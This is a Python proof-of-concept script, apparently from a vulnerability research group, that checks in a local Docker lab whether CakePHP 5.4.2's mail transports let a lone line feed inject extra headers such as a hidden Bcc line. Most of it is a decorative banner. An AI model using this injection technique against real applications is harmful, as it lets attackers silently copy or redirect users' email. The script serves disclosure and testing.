#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: cakephp-smtp-crlf (High: 7.5)
#  Vendor: CakePHP (Cake Software Foundation)
#  Versions: CakePHP 5.4.2 SmtpTransport / MailTransport
#  Impact: SmtpTransport still injects mail headers on a lone LF after GHSA-2qh5
#  Requires: app copies user data into Message setHeaders; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "cakephp-smtp-crlf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove CakePHP 5.4.2 Smtp/Mail transports strip only the two-byte CRLF pair."""


import json
import os
import socket
import subprocess
import time
from pathlib import Path

LABEL = "cakephp-smtp-crlf"
WITNESS = "CAKEPHP-SMTP-CRLF-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
SMTP_HOST = "127.0.0.1"
SMTP_PORT = 19410
BCC_LINE = "bcc: lab@localhost.invalid"
ORACLE_LINE = f"x-oracle: {WITNESS.lower()}"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def header_lines(blob: str) -> list[str]:
    text = blob.replace("\r\n", "\n").replace("\r", "\n")
    head, _, _rest = text.partition("\n\n")
    return [line.strip() for line in head.split("\n") if line.strip()]


def has_header(lines: list[str], needle: str) -> bool:
    want = needle.lower()
    return any(line.lower() == want or line.lower().startswith(want) for line in lines)


def dump_headers(name: str, blob: str) -> None:
    lines = header_lines(blob)
    log(f"IOC {name}-header-count {len(lines)}")
    for line in lines:
        low = line.lower()
        if low.startswith(("x-meta:", "bcc:", "x-oracle:", "subject:", "from:", "to:")):
            shown = line if len(line) <= 240 else line[:240] + "..."
            log(f"IOC {name} {shown}")


def send_case(case: str) -> dict[str, object]:
    eml_path = WORK / "last.eml"
    if eml_path.exists():
        eml_path.unlink()
    proc = compose("exec", "-T", "app", "php", "/var/www/html/send.php", case, timeout=30)
    stdout = proc.stdout or ""
    stderr = proc.stderr or ""
    log(f"IOC send-{case} exit={proc.returncode}")
    if proc.returncode != 0:
        log(f"IOC send-{case}-stderr {stderr.strip()[:400]!r}")
        raise RuntimeError(f"send-{case}-exit-{proc.returncode}")
    line = stdout.strip().splitlines()[-1] if stdout.strip() else ""
    try:
        payload = json.loads(line)
    except json.JSONDecodeError as exc:
        log(f"IOC send-{case}-stdout {stdout[:400]!r}")
        raise RuntimeError(f"send-{case}-bad-json") from exc
    deadline = time.monotonic() + 8
    while time.monotonic() < deadline and not eml_path.is_file():
        time.sleep(0.1)
    eml = eml_path.read_text(encoding="utf-8", errors="replace") if eml_path.is_file() else ""
    payload["smtp_data"] = eml
    return payload


def wait_smtp() -> bool:
    try:
        with socket.create_connection((SMTP_HOST, SMTP_PORT), 2) as sock:
            sock.settimeout(3)
            greeting = sock.recv(128)
        return greeting.startswith(b"220")
    except OSError:
        return False


def main() -> int:
    log(f"label={LABEL} smtp={SMTP_HOST}:{SMTP_PORT}")
    WORK.mkdir(parents=True, exist_ok=True)
    if not wait_smtp():
        return fail("smtp-not-ready")

    try:
        control = send_case("crlf")
        inject = send_case("lf")
        cr_only = send_case("cr")
    except RuntimeError as exc:
        return fail(str(exc))

    log(f"IOC cakephp {control.get('cakephp')!r}")
    for name, row in (("crlf", control), ("lf", inject), ("cr", cr_only)):
        smtp_headers = str(row.get("smtp_headers") or "")
        mail_headers = str(row.get("getHeadersString_mail") or "")
        data = str(row.get("smtp_data") or "")
        dump_headers(f"{name}-smtp-headers", smtp_headers)
        dump_headers(f"{name}-mail-headers", mail_headers)
        dump_headers(f"{name}-smtp-data", data)

    control_data = header_lines(str(control.get("smtp_data") or ""))
    control_hdr = header_lines(str(control.get("smtp_headers") or ""))
    lf_data = header_lines(str(inject.get("smtp_data") or ""))
    lf_hdr = header_lines(str(inject.get("smtp_headers") or ""))
    lf_mail = header_lines(str(inject.get("getHeadersString_mail") or ""))
    cr_hdr = header_lines(str(cr_only.get("getHeadersString_smtp") or ""))

    if str(control.get("cakephp") or "") != "5.4.2":
        return fail("pin-not-5.4.2")
    if not control_data:
        return fail("control-no-smtp-data")
    if has_header(control_data, BCC_LINE) or has_header(control_hdr, BCC_LINE):
        return fail("control-crlf-still-injected")
    if WITNESS.lower() in "\n".join(control_data).lower() and has_header(
        control_data, ORACLE_LINE
    ):
        return fail("control-oracle-line")
    if "okBcc:" not in str(control.get("smtp_headers") or "") and "okbcc:" not in (
        str(control.get("smtp_headers") or "").lower()
    ):
        # pair strip concatenates; tolerate either okBcc or missing if fully dropped
        joined = str(control.get("smtp_headers") or "")
        if "Bcc:" in joined.split("X-Meta:", 1)[-1].split("\n", 1)[0]:
            pass
        else:
            log(f"IOC control-x-meta {joined[:200]!r}")

    if not has_header(lf_data, BCC_LINE) and not has_header(lf_hdr, BCC_LINE):
        return fail("lf-no-bcc-line")
    if not has_header(lf_hdr, BCC_LINE):
        return fail("lf-getHeadersString-no-bcc")
    if not has_header(lf_mail, BCC_LINE):
        return fail("lf-mail-getHeadersString-no-bcc")
    if not has_header(lf_data, ORACLE_LINE) and not has_header(lf_hdr, ORACLE_LINE):
        return fail("lf-no-witness-header")

    cr_joined = "\n".join(cr_hdr)
    cr_keeps_break = "\r" in str(cr_only.get("getHeadersString_smtp") or "") or has_header(
        cr_hdr, BCC_LINE
    )
    if not cr_keeps_break and "Bcc:" not in cr_joined:
        return fail("cr-also-stripped")

    how = "smtp-data-bcc-line"
    log(
        f"SUCCESS {LABEL} pin=5.4.2 control-crlf-stripped=yes "
        f"lf-bcc=yes cr-leftover=yes how={how} {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

